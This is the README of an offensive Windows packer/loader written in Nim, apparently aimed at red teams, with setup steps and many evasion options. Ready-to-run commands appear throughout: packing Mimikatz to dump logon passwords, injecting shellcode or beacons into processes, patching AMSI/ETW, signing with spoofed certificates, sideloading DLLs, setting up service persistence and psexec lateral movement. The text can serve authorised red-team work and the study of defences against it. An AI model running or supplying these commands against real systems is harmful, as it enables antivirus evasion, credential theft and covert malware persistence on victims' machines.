# NimSyscallPacker / Loader

This tool was made public after a talk at [x33fcon](https://x33fcon.com/#!s/FabianMosch.md). It was my private main coding project from 2021 - 2024 and it now considered deprecated and is not maintained anymore. Dont expect bug fixes or feature updates here from my side. Instead, [RustPack](https://msecops.de/products) is maintained now as a commercial and controlled version for vetted Red Teams and Pentesters which is even more feature rich but also much more OPSec save.

This Packer can be used to pack any C# Assembly, PE-File or Shellcode into a Nim binary. It will encrypt the target payload, build the corresponding Nim source code according to the given arguments and compiles it to an Nim binary.


### Setup

A Video - if you prefer that - can be found here:
[https://youtu.be/0PwIn3Nxmgo](https://youtu.be/0PwIn3Nxmgo)

#### Windows

Git needs to be installed for Nim/Nimble to work properly.

Tested with **Nim 2.2.10** and the **MinGW-w64 GCC 11.1.0** bundle linked from the Nim Windows download page. Newer Nim releases default to a high PE image base on Windows, which breaks `-static` links with `relocation truncated to fit: R_X86_64_32S against .bss`; the packer now forces `-Wl,--image-base=0x10000` to keep static builds working, so any MinGW-w64 11.x build should be fine. Only **x64** is supported here — x86/`--x86`/`--wow64` is not maintained.

1. Download Nim and MinGW (x86_64):
   - [`nim-2.2.10_x64.zip`](https://nim-lang.org/download/nim-2.2.10_x64.zip)
   - [`mingw64.7z`](https://nim-lang.org/download/mingw64.7z) (linked from the Nim Windows install page)
2. Extract Nim with **7-Zip** (not Windows' built-in `Expand-Archive` — it silently drops `lib\system.nim` because of the case-collision with the `lib\system\` directory). The Nim zip ships `bin\7zG.exe` which you can use to extract MinGW.
3. Add `<nim>\bin` and `<mingw64>\bin` to your `%PATH%`. Logoff/logon (or restart your shell) for the change to take effect.
4. Install nimble dependencies:

   ```batch
   nimble install nimcrypto@0.6.0 docopt ptr_math winim https://github.com/S3cur3Th1sSh1t/nim-strenc/
   ```

   Versions known to work (as of Nim 2.2.10): `nimcrypto 0.6.0`, `docopt 0.7.1`, `ptr_math 0.3.0`, `winim 3.9.4`, `nim-strenc` (HEAD — the repo has no tagged releases).

5. Disable Windows Defender Sample Submission (the Packer refuses to run otherwise):

   ```powershell
   Set-MpPreference -SubmitSamplesConsent 2
   ```

6. Compile the Packer:

   ```batch
   nim c NimSyscallLoader.nim
   ```

If you want to use the LLVM obfuscator on Windows, use the embedded modified denim version from [denim](https://github.com/S3cur3Th1sSh1t/denim). Install it via `denim\denim.exe setup`.

#### Linux

E.g. on Kali / Debian. The packer historically required `nim 1.6.8` + `mingw-64 8.0.0-1`; with the static-link `--image-base=0x10000` workaround now baked in, newer toolchains should work too. The Windows build is what's actively tested — Linux is best-effort.

```bash
apt-get install nim mingw-w64
nimble install nimcrypto@0.6.0 docopt ptr_math winim https://github.com/S3cur3Th1sSh1t/nim-strenc/
```

If `--hellsgate` fails to assemble on a newer mingw-w64, downgrade to `mingw-64=8.0.0-1`.

Install donut via `pip3 install donut-shellcode`. `denim` cannot be used from Unix so obfuscation via LLVM is not possible here. Same for Callobfuscator.

Compile the Packer via `nim c -d:noRES NimSyscallLoader.nim`. Ready to go. If you don't use -d:noRES you might get the following error:
```
/username/.nimble/pkgs/winim-3.7.1/winim/lib/winim64.res:(.rsrc+0x48): dangerous relocation: collect2: fatal error: ld terminated with signal 11 [Speicherzugriffsfehler]
compilation terminated.

```

#### Docker Setup

Needs to be built once (takes some time the first time, subsequent builds will be cached).

`sudo docker build . -t nimsyscallloader`

Then run the packer with:

`sudo docker run -v $(pwd):/shared nimsyscallloader <ARGUMENTS> --output=/shared/packed.exe`
where `$(pwd)` is the directory on the host system that is shared with the container, i.e. the directory where the files to encrypt should be and where the output will be saved to.

#### Third party deps

If you want to make use of Code Signing certificates via LimeLighter you'll also need the following things installed and in your %PATH%:
openssl - (for Windows) for example from [here](https://slproweb.com/products/Win32OpenSSL.html)
osslsigncode - for example from [here](https://github.com/mtrojnar/osslsigncode/releases/tag/2.3)

##### Third party tool support

I will not give Support for issues in the third party tools which are used here. So please open up an issue in the corresponsing repositories if you're facing problems with them. Third party tools in use:

- [Donut](https://github.com/S4ntiagoP/donut/tree/syscalls)
- [Denim](https://github.com/S3cur3Th1sSh1t/denim)
- [LimeLighter](https://github.com/Tylous/Limelighter)
- [Callobfuscator](https://github.com/d35ha/CallObfuscator)
- [NimlineWhispers3](https://github.com/klezVirus/NimlineWhispers3)
- [Koppeling](https://github.com/monoxgas/Koppeling/)

You can either use my precompiled binaries or of course compile them your own from the above links.

### Usage

A Video - if you prefer that - can be found here:
[https://youtu.be/UHaIgdzqHDA](https://youtu.be/UHaIgdzqHDA)

I also added short videos for some features as this was requested:

**Caro-Kann:**

https://youtu.be/etAFZrIyb44

**ThreadlessInject Feature:**

https://youtu.be/eRS-4AywrHI

**Module Stomping Feature:**

https://youtu.be/l-TmqqQ49UI

**shellcodeURL Feature:**

https://youtu.be/OYxcL4D7K0c

**stegoFile Feature:**

https://youtu.be/Vr58_R4rYDA

**shellcodeFile Feature:**

https://youtu.be/Oj55uilxEF4

**Ruy Lopez for local processes**

https://youtu.be/8fBkRo1zlIM

**Shellcode output format**

https://youtu.be/ZTiZA2fg3WM

**Assembly output feature**

https://youtu.be/TDEJ-U18UIk

**And I made a public Video showcasing how to customize ThreadlessInject technique to other processes than the default one:**

https://youtu.be/BYuAUYQcI-E

```
NimSyscall_Loader v 2.2

Usage:
  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --keyfile=<keyFile> --dnsKey --dnsdomain=<sub.example.com> --environmentalKey=<domain,username> --output=<output> --large --metadata --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --noNimMain --clone=<dllToClone> --dllProxy --cpl --xll --service --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --noOneShot --PatchAMSI --PatchETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --sleep-in-between=<10> --shellcode --RWX --CallbackExecute --localCreateThread --QueueApc --noWait --COMVARETW --remoteinject --customprocess=<processname> --blockDLLs --spoofArgs=<ArgumentstoSpoof> --parentProcess=<parentName> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --mapSection --unhook=<dllname1,dllname2> --reflective --obfuscate --macPayload --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2> --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --noAntidebug --noDefaultSandBox --noAntiEmulate --sleepycrypt --fluctuate --interactivePS --psout --psobfs --pslyrics --csout --scout --sourceonly --jmpEntry --jmpEntryDLL=<example.dll> --jmpEntryFunc=<exampleFunc> --dripallocate --dripsleep=<sleeptime-ms> --stegofile=<filepath> --ruy-lopez --threadless --threadlessDll=<dllname.dll> --threadlessFunc=<dllfunc> --poolparty=<number> --Caro-Kann --Caro-Kann-Thread --stomb --stombDll=<dllname.dll> --stombFunc=<dllfunc> --stombFunc2=<dllfunc2> --restore]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:

[general]

  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
    --keyfile keyfile  File to read key from
    --dnsKey    Use remote DNS TXT Record as key which is retrieved on runtime
      --dnsdomain sub.example.com    Specify a subdomain to use for the DNS TXT Record
  --environmentalKey value    Use environmental key (domain,username) to encrypt with
                              domain -> enumerate the current domain on runtime and use that as key
                              username -> enumerate the current username on runtime and use that as key
  --killdate yyyymmdd    Specify an date, after which the payload won't get executed anymore
  --output filename    Filename for encrypted exe/dll
  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
  --metadata    Set custom resource file information (cmd icon, CMD description, ntdll metadata for dlls by default)
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --debug    Compiles the binary in debug mode
  --x86    Compiles an x86 binary
  --wow64    (Compiles a x86 binary that can be used by x64 CPUs)
  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
  --verbose    Prints output to the console (for troubleshooting purposes)
  --psout    Powershell Output format, reflectively loading the packed binary
    --psobfs    Pre-obfuscated Powershell Template with Invoke-obfuscation.
    --pslyrics    Add Lyrics as comments to avoid some more detections
  --csout    C# Output format, reflectively loading the packed binary
  --scout    Shellcode Output format, reflectively loading the packed binary via donut
  --sourceonly    Dont compile but just create the source code and compile command
  --RWX    Use RWX memory permissions for Shellcode and PE-Loading (instead of default RX)
  --service    Create a Service binary or DLL, which can be used for Lateral Movement or Persistence
  --stegofile filepath    Path to a .bmp or jpeg file in which the encrypted payload will be embedded

[Payload retrieval options]

  By default, the Loader will embed the Payload into the output file. There are two alternatives to this:
  --shellcodeFile shellcodefileLocation(s)    Filename to retrieve Payload from - on Runtime (No embedding). The first location will also be the output file location. You can specify multiple locations, separated by a comma.
  --shellcodeURL shellcodeURL    URL to retrieve Payload from

[DLL options]

  --dll     Generate DLL instead of an executable
      --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
      --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
      --perfectdllhijack    Add DllMain and execute the Payload via "Perfect DLL Hijacking" to avoid LoaderLock issues (https://elliotonsecurity.com/perfect-dll-hijacking/)
      --noNimMain    Remove NimMain export to avoid this IoC (Use "--dllhijack" in addition to instead export DllMain or alternatively "--dllexportfunc DllMain")
      --clone value    Specify a local DLL to clone the API-Exports from via Koppeling
      --mutexoneshot    Use a Mutex to ensure the payload is only executed once per process tree
      --dllProxy    Generate a DLL-Proxying DLL - you need to put the legit DLL into the build directory. Two output DLLs will be generated: The proxy DLL and the randomly renamed legit DLL. (Credit to @byt3bl33d3r - https://github.com/byt3bl33d3r/NimDllSideload)
          --payloadFunction funcName    The function to execute the Payload with to not use DllMain
          --noRandom    Don't randomize the DLL-Name but forward to the original DLL instead (No need to copy the original DLL, only works for builtin windows DLLs)
      --cpl    Generate a CPL file (Control Panel Applet) instead of an executable
      --xll    Generate an XLL file (Excel Add-In) instead of an executable

[evasion]

  --sleep 10    Sleep 10 seconds before decryption to evade memory scanners
  --sleep-in-between 10    Sleep 10 seconds at some potentially critical steps in between to evade memory scanners
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --unhook value    Unhook the specified DLL before doing anything else for the current process
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
  --macPayload    Convert the encrypted Shellcode to MAC-Adresses to reduce entropy (for embedded Payloads only)
  --sgn    Encode shellcode via SGN before encrypting it
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --noOneShot    By default the Packer uses Hardware Breakpoints to bypass AMSI, but disables it after the payload has been executed. If you want to keep it enabled for the current Thread, use this option.
  --PatchAMSI    Bypass AMSI by patching an offset of amsi.dll/AmsiScanBuffer via Syscalls
  --PatchETW    Bypass ETW by patching ntdll.dll/NtTraceEvent via Syscalls
  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/)
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
                     WindowChanges -> Checks, if the current Window has changed 7 or more times before executing the payload
        --domain targetdomain    Specify a domain for SandBox Evasion
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --sign    Sign the binary with a spoofed certificate
      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
  --noAntidebug    Leave out AntiDebugger Checks
  --noDefaultSandBox    Leave out default Sandbox Checks
  --noAntiEmulate    Leave out AntiEmulation Checks
  --jmpEntry    This option will enable a custom Shellcode Entrypoint from a DLL backed function to avoid unbacked memory as Thread/APC start address. The target function will be hooked with a JMP to the Shellcode
    --jmpEntryDLL value    Specify a DLL to use for the custom Shellcode Entrypoint
    --jmpEntryFunc value    Specify a function to use for the custom Shellcode Entrypoint
  --ruy-lopez    Use Ruy-Lopez to prevent AV/EDR DLLs from being loaded into the local or newly spawned process. (Doesnt work for injection into existing processes)

[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]

  --hellsgate    Retrieve Syscalls via Hellsgate technique
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
        --jump    When using Syswhispers3, use the jumper_randomized technique

[shellcode specific]

  --shellcode    Encrypt shellcode to load it on runtime
  --dripallocate    Allocate memory Driploader style (multiple small memory chunks after another to avoid memory scans after ETWti/Kernel Callback triggers)
      --dripsleep 500    Sleep time in ms between each memory allocation (e.G. 500 milisec)
  --CallbackExecute    Execute shellcode via a custom Callback function
  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
  --QueueApc    Instead of a direct Pointer or Thread Creation execute the Shellcode via NtQueueApcThread
  --noWait    Don't use 'WaitForSingleObject(-1,-1)' after local Injection but exit the process instead afterwards. If your Shellcode exits the Thread/Process itself, this will not have any effect.
  --mapSection    Map the shellcode into via NtCreateSection/NtMapViewOfSection . For remote injection decryption will happen AFTER writing the Shellcode into the remote process
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
      --spoofArgs ArgstoSpoof    Spoof the arguments of the process to inject into
      --parentProcess parentProcName    Name of the parent Process to spoof (PPID Spoofing)
      --blockDLLs    Set the DllBlocklistPolicy to 1 to prevent DLLs from being loaded
      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
      --remotepatchETW    Patch ETW in the remote process before shellcode execution
  --threadless    Use Threadless inject for shellcode execution (https://github.com/CCob/ThreadlessInject)
  --threadlessthread    Use Threadless inject but the trampoline will create a thread instead of CALL to the target address (no impact on the target process but additional IoC)
      --threadlessDll dllname    Specify a DLL to use for the Threadless inject hook
      --threadlessFunc dllfunc    Specify a function to use for the Threadless inject hook
  --poolparty number    Use Poolparty technique 1,2,3,4 for execution
  --conhostinject    Inject into a remote conhost.exe process and trigger execution without Thread or APC or similar
  --Caro-Kann    Use Caro-Kann technique to bypass initial memory scan detections by injecting a second shellcode which sleeps and decrypts (https://github.com/S3cur3Th1sSh1t/Caro-Kann)
  --Caro-Kann-Thread   Same as Caro-Kann, but the Shellcode will not do a direct JMP but instead create a Thread on the start address
  --stomb    Enable Module Stomping to not do memory allocations. By default, 'chakra.dll' is loaded and stomped.
      --stombDll dllname    Specify a DLL to use for the Module Stomping (default is 'chakra.dll')
      --stombFunc dllfunc    Specify a function to use for the Module Stomping
      --stombFunc2 dllfunc2    Specify a second function to use for the Module Stomping. Only needed if you combine Caro-Kann with Module Stomping as there are two shellcodes than
      --restore    Using this option will restore the .text section of the stomped DLL after executing the shellcode. That way, you get rid of Module Stomp IoCs. But this option only works with Payloads, that are reflective DLLs or which create a new thread.

[PE Packing]

  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE

[C# assembly Packing]

  --csharp    Encrypt a C# assembly to load it on runtime
  --interactivePS    Load an interactive unmanaged Powershell Runspace

```

By default, the Packer uses SandBox evasion and AntiDebug functionalities for every Payload. If you don't want them to be enabled (e.G. to remove their IoCs) or for any other reason you can use the flags `--noAntidebug` or `--noDefaultSandBox`. Every other SandBox check from the options will be added in addition to the existing ones and not as replacement.

All Payloads are by default executed in an `RX` memory region. Some Payloads won't work with `READ_EXECUTE` only. To use `RWX` instead you can enable that with the flag `--RWX`.

Also by default, Payloads are embedded in the resulting binary as encrypted array. This leads to high entropy and can also lead to detections by some AV/EDR vendors due to that. I recommend to instead use `--shellcodeFile` or `--shellcodeURL` to retrieve the Payload from a different file or Webserver on runtime. This also leads to SandBox Evasion as side-effect. For example when using:

```batch
NimSyscallLoader --file calc.bin --shellcodeFile test.txt --output test.exe
```, the encrypted Payload will be retrieved from `test.txt` on runtime. So this second file also needs to be placed onto the target system.

If you`re not in a hurry, I can also recommend using the options `--sleep numberOfSeconds` and or `--sleep-in-between numberOfSeconds` for any Payload, as that will lead to memory Scan and or behaviour based detection bypasses.

To pack Mimikatz for example with unhooking before execution and without bypassing AMSI use the following:

```batch
NimSyscallLoader --file=mimikatz.exe --unhook --noAMSI --peinject
```

Some of you had problems loading Mimikatz with the packer via "--file=Mimikatz --peload" arguments to afterwards issue custom commands on runtime.

I found the reason for this behaviour. Don't ask me why but you cannot just take the release from Github but have to compile Mimikatz on your own (or build a custom version) and load this instead of the official release. Also use `--noAntidebug` for Mimikatz as if not it has strange results (dont ask me why, other PE's are loaded fine).

If you still want to embed the release version from github you can directly pass arguments like this:

```batch
Packedmimikatz.exe coffee exit
```

You can also hardcode arguments for `--peload`, `--csharp` or `--peinject` payloads, e.g. the following would patch the command line arguments to be `privilege::debug sekurlsa::logonpasswords exit`:

```batch
NimSyscallLoader --file mimikatz.exe --peload --RWX --arguments "privilege::debug sekurlsa::logonpasswords exit" --noAntidebug
``` 

Donut shellcode is detected by some AV/EDR vendors. As alternative for PE-Loading I modified my [Nim-RunPE](https://github.com/S3cur3Th1sSh1t/Nim-RunPe) to use Syscalls for PE-Loading and integrated it here:

To pack Mimikatz for example and load it via syscall PE-Loader use the following:

```batch
NimSyscallLoader --file=mimikatz.exe --peload --RWX
(RWX is important here, as many binaries have problems being executed with only READ_EXECUTE permissions, which is default)
```

To pack Shellcode for local injection:

```batch
NimSyscallLoader --file=shellcode.bin --noAMSI
```

To load shellcode into a remote process:

```batch
NimSyscallLoader --file=shellcode.bin --noAMSI --remoteprocess=teams.exe
```

To load a C# assembly:
```batch
NimSyscallLoader --file=Seatbelt.exe --csharp
```
To load a C# assembly with arguments:
```batch
NimSyscallLoader --file=Rubeus.exe --csharp --arguments='hash /password:Aa1234'
```

To load a C# assembly and use hellsgate for Syscall retrieval :
```batch
NimSyscallLoader --file=Seatbelt.exe --csharp --hellsgate
```

To pack Shellcode for local injection + hellsgate usage + self-delete + sandbox checks:

```batch
NimSyscallLoader --file=beacon.bin --hellsgate --self-delete --sandbox=DomainJoined,MemorySpace
```

To add several thousand english words to bypass "Machine learning" detections:

```batch
NimSyscallLoader --file=Seatbelt.exe --csharp --pump=words
```

To use Syswhispers3 with/without jumper_randomized technique:

```batch
NimSyscallLoader --file=calc.bin --syswhispers
NimSyscallLoader --file=calc.bin --syswhispers --jump
```

To encode shellcode with sgn before encrypting:

```batch
NimSyscallLoader --file=calc.bin --sgn
NimSyscallLoader --file=mimikatz.exe --peinject --sgn
```

To spawn a custom process and inject into that afterwards + Patch AMSI/ETW in the remote process:

```batch
NimSyscallLoader --file=calc.bin --remoteinject --customprocess rundll32.exe --remotepatchAMSI --remotePatchETW
```

To generate an DLL as output instead of an executable just add the `--dll` parameter. You can also define custom export functions via `--dllexportfunc Export1,ExportFunc2`. Theese custom exports can also be used for DLL sideloading.

LLVM description stolen from [https://github.com/icyguider/Nimcrypt2](https://github.com/icyguider/Nimcrypt2) - I did not test this myself yet!

**OPTIONAL:** To use the [Obfuscator-LLVM](https://github.com/heroims/obfuscator) flag, you must have it installed on your system alongside [wclang](https://github.com/tpoechtrager/wclang). I've found this to be a bit of a pain but you should be able to do it with a little perseverance. Here's a quick step-by-step that worked on my Kali Linux system:
1. Clone desired version of Obfuscator-LLVM and build it
2. Once compiled, backup the existing version of clang and move the new Obfuscator-LLVM version of clang to /usr/bin/
3. Install wclang and add it's binaries to your PATH
4. Backup existing clang library files, copy new newly built Obfuscator-LLVM library includes to /usr/lib/clang/OLD_VERSION/

In addition, you must add the following lines to your `nim.cfg` file to point nim to your wclang binaries:
```
amd64.windows.clang.exe = "x86_64-w64-mingw32-clang"
amd64.windows.clang.linkerexe = "x86_64-w64-mingw32-clang"
amd64.windows.clang.cpp.exe = "x86_64-w64-mingw32-clang++"
amd64.windows.clang.cpp.linkerexe = "x86_64-w64-mingw32-clang++"
```

### Service binaries

Service binaries don't run on the fly. They can just be used for Windows Services. So if you're compiling a Service binary with `--service` you will need to create a new service with that binaries location. This can be done for example like this:

```batch
sc.exe create Updater binpath="C:\windows\system32\service.exe"
sc.exe start Updater
```

The Packer binaries can also be used for impacket-psexec Lateral Movement:

```
impacket-psexec muster.local/admin:password@IP -c service.exe -remote-binary-name service.exe -service-name lateralmovement
```

Service DLLs need additional configurations. You can read [the following blog](https://www.ired.team/offensive-security/persistence/persisting-in-svchost.exe-with-a-service-dll-servicemain) and need some Registry changes:

```batch
sc.exe create Updater binPath= "c:\windows\System32\svchost.exe -k DcomLaunch" type= share start= auto
reg add HKLM\SYSTEM\CurrentControlSet\services\Updater\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\windows\system32\service.dll /f
```

In addition the `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost` - `DcomLaunch` value needs to be adjusted to also contain your Service name.

If you're receiving ERROR 1053 on Service start you will most likely have forgotten the last entry.

### Handling Golang binaries with the Packer

My custom `Nim-RUNPE` implementatation unfortunately cannot handle GoLang binaries at the moment. That's some strange bug within Nim, have to investigate deeper sometime. Definitely a rabbit whole, already spent a lot of time.

For for the moment as workaround you can use `--peinject --large` to generate shellcode out of the golang binary to execute that either locally as executable or DLL.

Example:

```batch
NimSyscallLoader --file chisel.exe --peinject --large --output ChiselPacked.exe

or

NimSyscallLoader --file chisel.exe --peinject --large --dll --arguments "client https://chisel-demo.herokuapp.com 3000" --output ChiselPacked.dll
```

You `have to` pass hardcoded arguments when using a DLL, because `PEInject` DLLs don't accept arguments from the target host. Remote injection is also possible but arguments cannot be hardcoded here.

Defender detects Golang Packed binaries at the moment, pretty sure because of the very HIGH entropy (big payloads, so the binary contains 95% or more encrypted content). To avoid theese detections use either a DLL or `--pump` with any value.

### DLL-Sideloading

You can generate DLL-Sideloading capable Payloads with the flag `--clone DLLName`.

For example the following would generate a `version.dll` with the API Exports of the original Windows `version.dll`:

```batch
NimSyscallLoader.exe --file C:\dontscan\calc64thread.bin --dll --clone C:\windows\system32\version.dll --output version.dll
```

This could be used for various legitimate signed binaries for Sideloading, such as `OneDriveUpdater.exe`, `slllauncher.exe` and more. Some points are important to note and you should take care yourself about them:

* Using Shellcode with Exitfunction=Process will most likely lead to a crash in the Host binary
* Using local injection will lead to a not starting binary, as the DLL will not finish with execution for C2-Payloads
* There currently is a bug or Problem with C# payloads and Nim Sideloading. Those payloads are simply not executed when run locally (`--csharp` or `--peinject`), have to investigate
* I cannot recommend using Nim DLL Sideloading Payloads with Teams.exe - had strange behaviours here for certain DLLs and Teams didn't start anymore in many cases. It's also detected by many EDR vendors in the meanwhile
* TEST your payloads before using them. 

Take your time to search for custom Sideloading binaries or use some of the known documented ones from a location such as [https://hijacklibs.net/](https://hijacklibs.net/).

### Custom Images or meta data

If you want to use custom Icons for your loader executables or custom metadata, you should change the `cmd.rc` file in the resources folder.

That can be compiled to an `cmd.o` file via `windres cmd.rc -o cmd.o`. You can also just replace the `demo.ico` file with any other ICON file you want to use.

For DLL metadata you can change `DLL.rc`.

### Other Entropy detections or alternative SandBox Evasion

Some vendors, such as ESET flag binaries/dlls due to the encrypted Payload being in the binary as blob with high entropy. Theese kind of detections and or SandBox checks can get bypassed with the flags `--shellcodeFile` or `--shellcodeURL`, as the Payload is than not embedded in the resulting binary anymore but loaded from a separate file or from a remote Webserver.

### ThreadlessInject - stuff to care for

If you want to use ThreadlessInject - you should know what youre doing. As its hooking an API in the remote process, this technique needs to be adjusted for each different remote process. You first need to know, which APIs are typically called regularly by the remote process to know what to hook. You can for example monitor this for common windows processes via  [API Monitor](http://www.rohitab.com/apimonitor). Adjust the hook to your target process, or the Payload won't execute.

The default values are only useful for the builtin spawn/inject `rundll32.exe` target, as this process regularly calls `NtWaitForMultipleObjects` from `ntdll.dll`. Other processes also call this function, but the recommendation here is to adjust the options to your target process.

### Module Stomping - stuff to care for

Module stomping gives us the advantage of not allocating memory for shellcode injection anymore, as we overwrite (a part) of the `.text` section from an already loaded DLL. If the DLL was not loaded already in the remote target process, it will get force loaded first over Creating a remote Thread on `LoadLibrary` or when using ThreadlessInject over an hook pointing to custom LoadLibrary-Shellcode. By default, the DLL `chakra.dll` is used for Stomping, which is in the most cases suitable due to it`s size. However, you can change the DLL via Packer parameters however you like.

To avoid CFG, the current implementation overwrites one (or with Caro-Kann enabled two) DLL entrypoints:

- `JsRunScript`
- `MemProtectHeapUnprotectCurrentThread`

If you change the DLL, you will also need to change the target function names, as they might not exist on other DLLs. Also, it could be a problem if there is either
1. Not enough space in the `.text` section of the target DLL for your Shellcode
2. Not enough space between the two functions in the `.text` section, so that the first is overwritten by the second

My code does not handle this situations and currently doesn`t check for them. So you should check the sizes and offsets before using it in production to be sure.

Also, might be obvious for some of you but servers use different DLLs than clients. The Loader/Tool therefore need to be adjusted when targeting Servers.

This Module Stomping implementation also does **not** load the DLL via `LoadLibraryEx` with `DONT_RESOLVE_DLL_REFERENCES`. This is the more unstable way of doing it, but I still implemented it this way to get rid of EDR detections for specific IoCs from this API usage.
For more information read this blog post:
- [https://bruteratel.com/release/2023/03/19/Release-Nightmare/](https://bruteratel.com/release/2023/03/19/Release-Nightmare/)

### Memory encryption

Currently, the Packer has two memory encryption techniques embedded. It's either `--fluctuate` for ShellcodeFluctuation or `--sleepycrypt` for SleepyCrypt.

ShellcodeFluctuation can currently only be used for C2-Payloads, that use Win32 Sleep as it hooks this function. In this case only the Shellcode will get encrypted in the stack everytime the implant sleeps.

SleepyCrypt will not only encrypt the Shellcode but the whole PE-Stack, meaning all sections of it. The downside is, that the encryption is independent of your implant and will take place in a fixed time value, e.g. 10 secconds encryption and one seccond execution time. This may lead to problems with execution for some C2-Frameworks.

### Why is my MSF- or CobaltStrike or XxX still flagged?

Read this:
[https://s3cur3th1ssh1t.github.io/Signature_vs_Behaviour/](https://s3cur3th1ssh1t.github.io/Signature_vs_Behaviour/)

## Known Bugs

- Using `--hellsgate` on Linux systems with a never mingw-gcc version will fail to compile
- Compile the Packer on Linux/Debian with `-d:noRES` to avoid compiler errors
- `--syswhispers --jump` in combination with `--peload` results in a crash. For the moment I can only recommend to not use this option as I have no clue where this sideeffect comes from
- `--obfuscate` cannot handle ASM-Stubs well and therefore cannot compile binaries with `--hellsgate` or `--syswhispers`
- XP/WS2k3 will only work with the flags `--syswhispers --noAntidebug --noDInvoke`
- `--x86` / `--wow64` is no longer maintained and currently broken with the bundled (non-multilib) MinGW-w64 toolchain. Use x64 builds.
- Newer MinGW-w64 linkers (11+) default to a high PE image base which breaks `-static` links with `relocation truncated to fit: R_X86_64_32S against .bss`. The packer now passes `-Wl,--image-base=0x10000` to the generated Loader compile command to work around this. If you build standalone Nim+static binaries with this stack you may need the same flag.

## TO-DO
- [x] PELoader via syscalls
- [x] Hellsgate support
- [X] Load only the needed Winim libraries
- [x] Remote process AMSI/ETW Patching based on [SnD_AMSI](https://github.com/whydee86/SnD_AMSI)
- [X] Use Syscalls for remote patching
- [X] Remotely load the "to patch" DLL (ntdll or amsi.dll) into the remote process before patching (otherwise it won't help us)
- [x] Hellsgate support for remote shellcode injection + PELoading
- [X] DLL output
- [X] DLL Sideloading capabilities
- [X] Powershell output
- [X] C# output
- [X] More syscalls and or D/Invoke for win32 functions
- [X] Cobalt Strike integration - CNA
- [ ] Passing parameters via e.g. manipulation of the PEB field (Command line spoofing like)
- [X] Passing parameters via API import function patching
- [X] Shellcode memory encryption via Sleep Hook [ShellcodeFluctuation like](https://github.com/mgeeky/ShellcodeFluctuation)
- [X] Calling the ‘GetConsoleWindow’ and ‘ShowWindow’ Windows function after the process is created and the EDR’s hooks are loaded, and then changes the windows attributes to hidden instead of GUI compile flags
- [X] More sleeps in between some potentially critical stubs
- [X] Define custom remote process to spawn before injecting into it (atm it's hardcoded notepad)
